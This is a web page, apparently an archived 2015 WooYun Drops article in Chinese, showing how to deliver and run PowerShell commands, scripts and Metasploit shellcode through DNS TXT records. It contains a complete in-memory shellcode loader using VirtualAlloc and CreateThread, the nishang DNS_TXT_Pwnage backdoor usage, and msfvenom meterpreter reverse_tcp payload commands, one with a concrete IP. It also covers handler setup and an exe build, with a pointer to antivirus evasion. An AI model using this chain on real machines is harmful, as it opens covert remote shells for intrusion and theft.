@@ -1,0 +1,147 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">通过DNS TXT记录执行powershell</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Evi1cg</a> <span class="bull">·</span> <time title="2015/10/06 12:14" ui-time="" datetime="2015/10/06 12:14" class="published ng-binding ng-isolate-scope">2015/10/06 12:14</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00简介</h1><hr><p>DNS TXT记录一般用来记录某个主机名或者域名设置的说明，在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。本篇文章主要介绍如何使用<a href="https://github.com/samratashok/nishang">nishang</a>通过创建TXT记录执行powershell脚本。当然，首先你要有一个域名。</p><h1>0x01创建TXT记录</h1><hr><p>这里需要使用nishang中的一个脚本<a href="https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1">OUT-DnsTxt</a>。</p><h2>1.常见命令</h2><p>因为常见命令比较短，所以可以直接添加到TXT记录中，如下图：</p><p><img alt="Alt text" img-src="cb635f4d7b2fbb68cc2b4d451fd2fd3297979c31.jpg"></p><p>现在查看一下TXT记录：</p><p><img alt="Alt text" img-src="c3d6dfe65eed896558d9805e77ceb893c69fe7e9.jpg"></p><p>可以看到记录已经成功添加了。</p><h2>2.脚本</h2><p>由于TXT记录长度限制为255,如果要添加一个脚本到记录里面，需要添加多个TXT记录。下面是一个例子,自己写了一个PSH脚本：</p><pre><code>#!powershell
+function Get-User
+{
+&lt;#
+.SYNOPSIS
+Script to generate DNS TXT for a test.
+.DESCRIPTION
+Use this script to get user information. to be more big.. more big... big..Do one thing at a time, and do well.Keep on going never give up.
+.EXAMPLE
+PS &gt; Get-User
+#&gt;    
+
+[CmdletBinding()]
+Param ()
+    net user
+}
+</code></pre><p>使用Out-Dnstxt进行转换：</p><pre><code>PS F:\DNS&gt; . .\Out-DnsTxt.ps1
+PS F:\DNS&gt; Out-DnsTxt -DataToEncode .\Get-User.ps1
+You need to create 2 TXT records.
+All TXT Records written to F:\DNS\encodedtxt.txt
+</code></pre><p>由于这个脚本比较小，所以只生产两行：</p><p><img alt="Alt text" img-src="e3b68059034c6c0457bae9776ac6756bf445a350.jpg"></p><p>可以分别将这两行内容按顺序添加到 1.ps.domain.com到2.ps.domian.com中如下图：</p><p><img alt="Alt text" img-src="1731ee80d007bdcc85a250c192640223eb93ce1a.jpg"></p><p>查看TXT，可以看到内容都已经添加好了：</p><p><img alt="Alt text" img-src="8bc20c45292615fa6fdbd3ce8310ee01ae958207.jpg"></p><h1>0x02 执行Powershell</h1><hr><p>添加完了TXT记录以后，通过<a href="https://raw.githubusercontent.com/samratashok/nishang/master/Backdoors/DNS_TXT_Pwnage.ps1">DNS&#95;TXT&#95;Pwnage.ps1</a>来执行这些脚本。</p><blockquote><p>DNS&#95;TXT&#95;Pwnage.ps1 是一个通过DNS TXT来接收命令或者脚本的一个后门脚本</p></blockquote><p>这里还需要添加两条记录，strat与stop，具体如下图：</p><p><img alt="Alt text" img-src="749079129f3b1740d42ceda0cbd97a915ee11fc1.jpg"></p><h2>1.执行命令</h2><pre><code>PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1
+PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring start -commanddomain command.evi1cg.me -psstring test -psdomain xxx.evi1cg.me -
+Subdomains 1 -StopString stop
+</code></pre><blockquote><p>解释一下参数：</p></blockquote><ul><li><strong>startdomain</strong>为创建的<em>start.domain</em>，返回一个字符串；</li><li><strong>cmdstring</strong> 为任意输入的字符串；</li><li><strong>commanddomain</strong>为创建的执行命令TXT记录的域名；</li><li><strong>psstring</strong>为任意输入的字符串；</li><li><strong>psdomain</strong>为创建的执行脚本TXT记录的域名或子域名 ；</li><li><strong>Subdomains</strong>为执行脚本创建TXT记录的个数（如1.2中创建的脚本，该值为2）；</li><li><strong>StopString</strong>为任意输入的字符串。</li></ul><p>此处比较重要的参数为<strong>startdomain</strong>，他会与我们输入的cmdstring以及psstring进行比较，如果与cmdstring值相等，则执行<strong>commanddomain</strong> 即命令，与psstring相等则执行<strong>psdomain</strong>即脚本。</p><p>上面为执行命令，所以cmdstring值我们输入为start，与start.evi1cg.me的txt记录值相等，psstring随便输入，不留空就行。执行结果如下图：</p><p><img alt="Alt text" img-src="aed46d02fd8a68ca2f204afa63367c20610decac.jpg"></p><p>我们可以通过修改command.domain的TXT值来执行不同的命令。比如Get-Host：</p><p><img alt="Alt text" img-src="3abc9d3226291b93b12b1d08307b940e3302d43e.jpg"></p><h2>2.执行脚本</h2><pre><code>PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1
+PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring bulabula -commanddomain command.evi1cg.me -psstring start -psdomain ps.evi1
+cg.me -Arguments Get-User -Subdomains 2 -StopString stop
+</code></pre><p>这里要注意，psstring的值为start，与start.domain的TXT记录相同，cmdstring为任意字符串。效果如下图：</p><p><img alt="Alt text" img-src="dcf40ec9b538bf5e6771ee36ef8ec138d41ace22.jpg"></p><blockquote><p>这里多一个参数<strong>Arguments</strong>，要写明要执行的函数名，测试发现，在脚本中含有中文时会失败。对于需要带参数的脚本可以修改脚本指定参数值。</p></blockquote><h1>0x03 执行Shellcode</h1><hr><p>可以通过TXT记录执行shellcode，首先，我们使用msf生成一个powershell的shellcode:</p><pre><code>☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp -f powershell LHOST=x.x.x.x LPORT=8887 &gt; pspayload.txt
+</code></pre><p>使用Out-DnsTxt对生成的文件进行转换：</p><pre><code>PS F:\DNS&gt; Out-DnsTxt -DataToEncode .\pspayload.txt
+You need to create 3 TXT records.
+All TXT Records written to F:\DNS\encodedtxt.txt
+</code></pre><p>然后将以上记录分别添加到TXT记录中，如下图：</p><p><img alt="Alt text" img-src="bc339674bde592c49e59646eefa825f678f75fdf.jpg"></p><p>测试使用的32位win7系统，使用msf开启监听：</p><pre><code>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LPORT 8887
+LPORT =&gt; 8887
+msf exploit(handler) &gt; set LHOST x.x.x.x
+LHOST =&gt; x.x.x.x
+msf exploit(handler) &gt; exploit    
+
+[*] Started reverse handler on x.x.x.x:8887
+[*] Starting the payload handler...
+</code></pre><p>我们还需要一个获取TXT记录并执行的脚本，这里我改了一个脚本：</p><pre><code>#!powershell
+function Execute-Code
+{
+&lt;#
+.PARAMETER Shelldomain
+The domain (or subdomain) whose subbdomain's TXT records would hold shellcode.
+.PARAMETER subdomains
+The number of subdomains which would be used to provide shellcode from their TXT records.
+ .PARAMETER AUTHNS
+Authoritative Name Server for the domains.
+.EXAMPLE
+PS &gt; Execute-Code
+The payload will ask for all required options.
+.EXAMPLE
+PS &gt; Execute-Code -Shelldomain 32.alteredsecurity.com -SubDomains 5 -AUTHNS f1g1ns2.dnspod.net.
+Use above from non-interactive shell.
+#&gt;
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $Shelldomain,
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $Subdomains,     
+        [Parameter(Position = 2, Mandatory = $True)]
+        [String]
+        $AUTHNS
+    )
+    function Get-ShellCode
+    {
+        Param(
+            [Parameter()]
+            [String]
+            $Shelldomain
+        )
+        $i = 1
+        while ($i -le $subdomains)
+        {
+            $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$Shelldomain $AUTHNS") 
+            $temp = $getcommand | select-string -pattern "`""
+            $tmp1 = ""
+            $tmp1 = $tmp1 + $temp
+            $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
+            $i++
+        }
+        #$encdata = ""
+        $dec = [System.Convert]::FromBase64String($encdata)
+        $ms = New-Object System.IO.MemoryStream
+        $ms.Write($dec, 0, $dec.Length)
+        $ms.Seek(0,0) | Out-Null
+        $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
+        $sr = New-Object System.IO.StreamReader($cs)
+        $sc = $sr.readtoend()
+        return $sc
+    }
+    $Shell = (Get-ShellCode $Shelldomain)
+    #Remove unrequired things from msf shellcode
+    $tmp = $Shell -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
+    [Byte[]]$sc = $tmp -split ','
+    #Code Execution logic
+    $code = @"
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("msvcrt.dll")]
+    public static extern IntPtr memset(IntPtr dest, uint src, uint count);
+"@
+    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
+    $size = 0x1000 
+    if ($sc.Length -gt 0x1000) {$size = $sc.Length} 
+    $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) 
+    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)}
+    Try {
+        $winFunc::CreateThread(0,0,$x,0,0,0)
+        sleep 100000
+        }
+    Catch
+    {
+    [system.exception]
+    "caught a system exception"
+    }
+}
+</code></pre><blockquote><p>参数说明，<strong>Shelldomain **为创建txt记录的域名或子域名;</strong>subdomains<strong>为创建TXT域名的个数，如上面所创建的为3;</strong>AUTHNS **为域的权威名称服务器，如我使用的狗爹，所以AUTHNS为f1g1ns2.dnspod.net</p></blockquote><p>在32位win7上执行：</p><pre><code>PS C:\Users\evi1cg\Desktop&gt; . .\Execute-Code.ps1
+PS C:\Users\evi1cg\Desktop&gt; Execute-Code -Shelldomain 32.evi1cg.me -subdomains 3 -AUTHNS f1g1ns2.dnspod.net
+</code></pre><p>成功获取meterpreter会话：</p><p><img alt="Alt text" img-src="c73eef6506e9cc1b3c7968793a7f496d5fcb27e7.jpg"></p><p>64位的请自行修改payload及脚本。</p><h1>0x04 补充</h1><hr><p>Metasploit中已经含有此脚本<a href="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/payloads/singles/windows/dns_txt_query_exec.rb">dns&#95;txt&#95;query_exec.rb</a>，此脚本查询TXT记录的顺序为a.domain,b.domain...,下面是一个示例，首先生成payload:</p><pre><code>☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=103.238.225.222 LPORT=8887 -e x86/alpha_mixed Bufferregister=EDI -f raw &gt; reverse.txt
+</code></pre><p>使用下面的脚本对该文件进行切割：</p><pre><code>#!python
+#!/usr/bin/env python
+#coding=utf-8
+def txt(string,length):
+    return [string[x:x+length] for x in range(0,len(string),length)]
+with open('out.txt','w+') as f:
+    line = open('reverse.txt','r').read()
+    line= txt(line,255)
+    for txts in line:
+        f.writelines(txts+'\n\n\n\n')
+</code></pre><p>输出如下：</p><p><img alt="Alt text" img-src="e31a289bfe402d4bd7032fba8a96ea14364a5470.jpg"></p><p>将这三行分别添加到a.domain,b.domain,c.domain的TXT记录中:</p><p><img alt="Alt text" img-src="aa4d75411a5dd8451d0f2e43cb3dd1a8539538c5.jpg"></p><p>生成exe:</p><pre><code>☁  ~  sudo msfvenom -p windows/dns_txt_query_exec DNSZONE=evi1cg.me -f exe &gt; test.exe
+</code></pre><p>msf开启监听：</p><pre><code>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST x.x.x.x
+LHOST =&gt; x.x.x.x
+msf exploit(handler) &gt; set LPORT 8887
+LPORT =&gt; 8887
+msf exploit(handler) &gt; exploit
+</code></pre><p>运行exe，获得meterpreter:</p><p><img alt="Alt text" img-src="9b2b7c1689f968c5ae75c5ae7b11910c6894169c.jpg"></p><p>至于免杀，可以直接生成c格式的shellcode,然后按照<a href="http://zone.wooyun.org/content/22796">打造免杀payload</a>来做。</p><h1>0x05 小结</h1><hr><p>本文主要介绍一种执行命令的方式以及nishang的脚本使用，希望能对大家有帮助。</p><p>本文由evi1cg原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/24" rel="bookmark" id="re1">使用Hash直接登录Windows</a></li><li><a href="http://drops.wooyun.org/tools/650" rel="bookmark" id="re2">tunna工具使用实例</a></li><li><a href="http://drops.wooyun.org/tips/12354" rel="bookmark" id="re3">Powershell之MOF后门</a></li><li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re4">Powershell tricks::Bypass AV</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">加州菲猫</span> <span class="reply-time">2015-12-11 15:18:50</span></div><p></p><p>https://www.offensive-security.com/reports/sample-penetration-testing-report.pdf</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">卡卡</span> <span class="reply-time">2015-10-27 16:43:51</span></div><p></p><p>有意思</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-10-08 08:48:50</span></div><p></p><p>我就给lz点个赞</p><p></p></div></div></div></div></div></main>
